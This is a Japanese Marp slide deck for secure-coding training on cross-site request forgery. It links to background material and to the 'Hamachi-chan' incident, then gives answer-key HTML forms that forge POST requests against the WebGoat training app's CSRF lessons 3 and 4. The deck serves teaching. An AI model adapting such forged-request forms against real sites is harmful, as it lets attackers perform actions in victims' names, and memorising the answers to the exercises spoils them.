---
theme: gaia
_class: lead
paginate: true
backgroundColor: #fff
backgroundImage: url('https://marp.app/assets/hero-background.jpg')
marp: true
---

# クロスサイトリクエストフォージェリ(CSRF)

---

# クロスサイトリクエストフォージェリ(CSRF)とは？

* secure-coding-training `クロスサイトリクエストフォージェリ(CSRF)` を参照
https://github.com/takapi86/secure-coding-training/blob/master/doc/README.pdf

* CSRF再現からコードの修正まで
https://www.youtube.com/watch?v=BSeZ-z3Cz4w

---

# はまちちゃん事件

[大量の「はまちちゃん」を生み出したCSRFの脆弱性とは？](https://www.itmedia.co.jp/enterprise/articles/0504/23/news005.html)
[ぼくはまちちゃん！ こんにちはこんにちは!!](https://ascii.jp/elem/000/000/063/63560/)
[webアプリケーションの脆弱性について](https://okwave.jp/qa/q6781762.html)

---

### 課題

クロスサイトリクエストフォージェリの3,4の課題をやっていきましょう
http://localhost:8080/WebGoat/start.mvc#lesson/CSRF.lesson/

---

### 正解例

3

```HTML
<form method="POST" action="http://localhost:8080/WebGoat/csrf/basic-get-flag">
  <input name="csrf" type="hidden" value="false">
  <input type="submit" name="submit">
</form>
```

4

```html
<form method="POST" action="http://localhost:8080/WebGoat/csrf/review">
  <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review"  type="text">
  <input class="form-control" id="reviewStars" name="stars" type="text">
  <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
  <input type="submit" name="submit" value="Submit review">
</form>
```
